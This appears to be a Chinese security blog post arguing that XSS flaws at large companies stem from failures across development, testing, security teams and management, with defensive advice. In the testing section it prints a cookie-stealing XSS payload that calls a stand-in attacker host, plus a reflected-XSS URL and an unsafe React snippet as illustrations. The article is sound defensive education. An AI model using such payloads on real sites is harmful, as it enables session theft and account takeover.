---
title: 一个年营收 800 亿的公司，还出现XSS 漏洞到底是谁的责任？
url: https://mp.weixin.qq.com/s/FUw05Cd5cO_Pdnk-L72sGQ
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T04:59:38.561526
---

# 一个年营收 800 亿的公司，还出现XSS 漏洞到底是谁的责任？

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XxWw1wD1zjiaH1dleHQFRuAt76NsuMzHGggdGReQCgG7L7eWFKrKZrXpS4bItaoEDLDd8ibiaLuBZTk6QsmD70ibdahytfnXawbGuse5tum4cdo/0?wx_fmt=jpeg)

# 一个年营收 800 亿的公司，还出现XSS 漏洞到底是谁的责任？

原创

筑梦网安
筑梦网安

全栈安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

---

## 导语：当"小漏洞"遇上"大公司"

想象一下这样的场景：

凌晨 1 点，某电商巨头（年营收 800 亿）的安全运营中心，警报声突然响起。安全工程师小李盯着屏幕，瞳孔骤然收缩——用户评论区出现了一个恶意脚本，只要有人点击，就能窃取 Cookie、冒充身份、甚至直接发起转账请求。

**这就是 XSS（跨站脚本攻击），一个存在了 30 多年、却依然让顶级互联网公司"翻车"的漏洞。**

问题来了：这么大的公司，为什么还会有 XSS？这到底是谁的责任？

今天，我们就来一层一层剥开这个问题的答案。

---

## 一、XSS 到底是什么？三句话讲清楚

![XSS攻击原理](https://mmbiz.qpic.cn/mmbiz_png/XxWw1wD1zjiask6kmkQNBW7tZvTXQ7y61M4L8Y530ibqvaES4e9YbxksBaE4BUG78Ec7ic9Vx5CuF47AgWvdwafaV1sHPPxXLCH3wasePmhtqg/640?wx_fmt=png&from=appmsg)

XSS攻击原理

| 类型 | 通俗解释 | 危险程度 |
| --- | --- | --- |
| **反射型 XSS** | 恶意链接骗你点，链接里藏了坏代码 | ⭐⭐⭐ |
| **存储型 XSS** | 坏代码被存进数据库，谁看谁中招 | ⭐⭐⭐⭐⭐ |
| **DOM 型 XSS** | 网页自己"作死"，JavaScript 把坏代码写到页面 | ⭐⭐⭐⭐ |

用一个真实案例类比：

> 某社交平台曾出现存储型 XSS 漏洞——用户在个人简介里输入了一段"特殊文字"，结果任何访问他主页的人，都会自动关注攻击者指定的账号。**攻击者什么都没做，就躺着收获了几十万粉丝。**

## 二、800 亿公司的技术架构里，XSS 漏洞是怎么"溜"进去的？

![XSS漏洞产生原因](https://mmbiz.qpic.cn/sz_mmbiz_png/XxWw1wD1zjhCzW8wicl4taVgl1O0KJEAibHich7nSvxibia3DmPLicCdAtiaPliacwyMVQ3scG9UKmh8m0ImYXMB76oWRlY73ibyHQGprHAg5sGl9Bso/640?wx_fmt=png&from=appmsg)

XSS漏洞产生原因

要理解责任归属，首先要理解**漏洞是怎么产生的**。

### 环节一：开发阶段——"我以为已经转义了"

前端开发小王接到了一个需求：在用户评论区展示富文本内容（支持加粗、表情）。

他心想："我用的是 React，React 默认就会转义 JSX，应该安全吧？"

于是他写了一段代码：

```
// 危险！ dangerouslySetInnerHTML 绕过了 React 的保护
<div dangerouslySetInnerHTML={{ __html: userComment }} />
```

**问题出在哪？**

React/Vue 确实会自动转义普通文本，但一旦你使用了 `dangerouslySetInnerHTML`（或 Vue 的 `v-html`），就等于亲手拆掉了防护网。如果后端没有对富文本做严格的 HTML 过滤（只允许白名单标签如 `<b>`、`<img>`），攻击者就能注入 `<script>` 或其他恶意标签。

**这不是技术问题，这是安全意识问题。**

### 环节二：测试阶段——"安全测试不是功能测试"

QA 工程师小张的测试用例里写着：

> 验证：用户输入 `<script>alert(1)</script>` 时，页面是否正常显示？

测试结果是：**页面正常显示，没有弹窗。测试通过！**

但实际上，攻击者用的是：

```
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**没有弹窗 ≠ 没有漏洞。** 现代 XSS 攻击早已进化，攻击者不再用 `alert()` 这种"低级手段"，而是静默窃取数据。如果测试团队只关注"功能是否正常"，而缺少专业的安全测试用例，漏洞就会从眼皮底下溜走。

### 环节三：上线阶段——"这个需求很急，先上线再说"

产品经理老刘在项目群里发消息：

> "双十一活动页面，今晚必须上线！安全评审后面补。"

结果活动页面的搜索框存在一个反射型 XSS：用户搜索关键词时，关键词被直接回显在页面标题上，没有任何转义。

攻击者构造了一个链接：

```
https://mall.example.com/search?keyword=<script>恶意代码</script>
```

然后通过短信/邮件/社交媒体传播。**双十一当天，数百万用户访问了这个页面。**

## 三、责任归属：这不是"某个人"的责任

![责任归属分析](https://mmbiz.qpic.cn/sz_mmbiz_png/XxWw1wD1zjhEH3ELSW8T3J1IPu0ySNCd3VcLNB9fEbsuDtEByhx1Exbl6u0buziaGbaofIzZicLJGpPicn41GmtK6vzr4Jl6QomvBABzDCbBicg/640?wx_fmt=png&from=appmsg)

责任归属分析

这是文章最核心的问题。一个 800 亿营收的公司出现 XSS，**不是"某个程序员写错了代码"这么简单。** 让我们从四个维度拆解：

### 1. 开发工程师：第一道防线（直接责任）

**责任点：**

* 没有对用户输入做充分的输出编码（Output Encoding）
* 不当使用了 `innerHTML`、`dangerouslySetInnerHTML`、`document.write` 等危险 API
* 没有遵循公司安全编码规范

**但说实话：** 很多开发者并不是安全专家。他们可能知道"要防 XSS"，但不知道具体怎么防、防到什么程度。让一个写业务代码的开发人员同时具备专业安全知识，这在很多公司并不现实。

### 2. 安全团队：规则制定者与守门员（管理责任）

**责任点：**

* 是否有完善的**安全编码规范**（Secure Coding Guidelines）？
* 是否有**自动化安全扫描**（SAST/DAST）集成到 CI/CD 流水线？
* 是否有**安全培训**机制，让开发了解常见漏洞？
* 是否有**Bug Bounty 计划**或**内部红蓝对抗**，主动发现漏洞？

如果安全团队只负责"事后救火"，而不做"事前预防"，那 XSS 漏洞的反复出现就是必然结果。

**关键指标：**

> 一个成熟的安全团队，应该在代码提交阶段就拦截 90% 以上的 XSS 漏洞，而不是等到上线后由外部白帽子发现。

### 3. 技术架构团队：框架与基础设施责任（系统性责任）

**责任点：**

* 是否提供了**安全的 UI 组件库**（自动转义的表单组件、富文本编辑器）？
* 是否统一了Content Security Policy（**CSP**）策略？
* 是否有统一的**输入校验层**（WAF/API Gateway 层面的防护）？

**一个优秀的架构设计，应该让"写出 XSS 漏洞"变得很困难。**

比如：

* 统一封装富文本编辑器，内置 XSS 过滤（基于白名单的标签和属性）
* 全局配置 CSP 策略，禁止内联脚本执行
* API Gateway 层面对常见 XSS Payload 做拦截

如果架构层面没有这些防护，每个开发者都要"各自为战"，漏洞的出现只是时间问题。

### 4. 管理层与产品经理：资源与流程责任（根本责任）

![流程与资源倾斜](https://mmbiz.qpic.cn/mmbiz_png/XxWw1wD1zjiaf2mf3JyWbnoUNutZQWwpXPyAqt0tpSmT75OTLOjnHsKibtlY0Uue8PAwMxQw2rl67FPqj5VNfxYOgWh1iamhiaj82jn1oswdoKM/640?wx_fmt=png&from=appmsg)

流程与资源倾斜

这是最隐蔽、但也是最重要的责任方。

**以下场景你是否熟悉？**

* "这个功能下周必须上线，安全评审走快速通道。"
* "安全部门提出的修复建议排到下个季度吧，当前优先级不高。"
* "我们没有预算购买商业化的安全扫描工具，先用开源的凑合一下。"

**800 亿营收的公司，安全预算占比是多少？安全人员的编制是否充足？安全是否是上线流程的强制卡点（Gate）？**

如果一个公司的 KPI 只考核"功能上线速度"和"业务营收"，而不考核"安全质量"，那么从管理逻辑上，XSS 漏洞的反复出现就是**系统性必然**。

## 四、真实的"责任归因"案例

![现状版本的责任归因](https://mmbiz.qpic.cn/mmbiz_png/XxWw1wD1zjh0YAQOkcK75iaNn8pvwezxib610XicWb760TZhgeD2fu7D5EEu8VLzup7bgicIicYEz9VNVtbupsLxVmrYDHqfkzRr8qWPtVsqpOnE/640?wx_fmt=png&from=appmsg)

现实版本的责任归因

某知名互联网公司曾出现一次严重的存储型 XSS 漏洞，复盘会议上的讨论如下：

| 角色 | 自我反思 |
| --- | --- |
| 前端开发 | "我确实用了 `v-html`，但当时急着上线，以为内容来源可信。" |
| 后端开发 | "我返回了用户输入的原始 HTML，以为前端会处理。" |
| QA | "测试用例里没有包含 XSS 攻击向量，我们主要关注功能逻辑。" |
| 安全团队 | "我们确实没有在这个项目里做代码审计，人力不够。" |
| 产品经理 | "deadline 太紧了，安全评审流程走了快速通道。" |

**最终结论：这不是任何一个人的问题，是整个研发流程的缺陷。**

改进措施：

1. **技术层面**：统一引入 DOMPurify 做富文本过滤，全局部署 CSP。
2. **流程层面**：所有涉及用户输入的页面，必须通过安全扫描后才能上线。
3. **组织层面**：安全团队扩编 30%，并设立"安全质量"作为各团队的考核指标之一。

## 五、XSS 到底怎么防？给不同角色的"防身术"

![XSS防御体系](https://mmbiz.qpic.cn/mmbiz_png/XxWw1wD1zjhBelK4TBO2MVXxtHv2FhGicEvk2k6ibBLoCiar2OJMWhD96Uq4O6QWYZ7nb5AM3uZZnxOVGqVcUw1gBpel8ZZCmTOXJTpWAKwKq8/640?wx_fmt=png&from=appmsg)

XSS防御体系

### 给开发者的三句话：

1. **永远不信任用户输入**——任何来自 URL、表单、Cookie、本地存储的数据，输出到页面之前都要编码。
2. **慎用危险 API**——避开 `innerHTML`、`document.write`、`eval()`，除非你有 100% 的把握。
3. **使用现代框架的默认行为**——React/Vue/Angular 的默认转义是可信的，不要手动关闭它。

### 给安全团队的三句话：

1. **左移（Shift Left）**——把安全检测放到代码提交阶段，而不是上线前。
2. **自动化 > 人工**——用工具（如 Semgrep、CodeQL、SonarQube）做持续扫描。
3. **建立安全文化**——让开发者觉得"写安全代码"和"写功能代码"一样重要。

### 给管理层的一句话：

> **"安全不是成本，是投资。一个 XSS 漏洞的代价，可能是品牌声誉、用户信任、甚至监管处罚——这些远比预防它的成本高得多。"**

## 结语：责任是"链条"，不是"靶子"

回到开头的问题：800 亿公司的 XSS 漏洞，到底是谁的责任？

**答案不是"某个人"，而是"整个链条"的失效。**

* 开发写了一段不安全的代码 → 但也许他没有接受过足够的安全培训
* 测试没有测出漏洞 → 但也许测试团队没有安全测试的资源
* 安全团队没有发现 → 但也许他们的人手只够覆盖 10% 的项目
* 管理层没有给足够的预算 → 但也许他们认为"安全是拖慢业务的因素"

**XSS 漏洞就像一面镜子，照出的不是某个工程师的技术水平，而是一个组织的安全成熟度。**

真正成熟的公司，不会问"是谁的责任"，而是会问："我们的流程哪里出了问题，如何让下一次漏洞不再发生？"

---

关注我，带你看懂技术本质！**用最接地气的"人话"拆解硬核知识**，让复杂概念变得简单易懂 🔥

> 如果你也遇到过类似的"背锅"经历，欢迎在评论区分享。

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/EWVicRs8Iibp9iaKRvibMWfUyy05zjY5NEcaVUC7zLaPSwZianNpfCl2njFsI1wfibWZlp3iar0leGw2TBUvrPVKT40FQ/0?wx_fmt=png)

全栈安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/EWVicRs8Iibp9iaKRvibMWfUyy05zjY5NEcaVUC7zLaPSwZianNpfCl2njFsI1wfibWZlp3iar0leGw2TBUvrPVKT40FQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过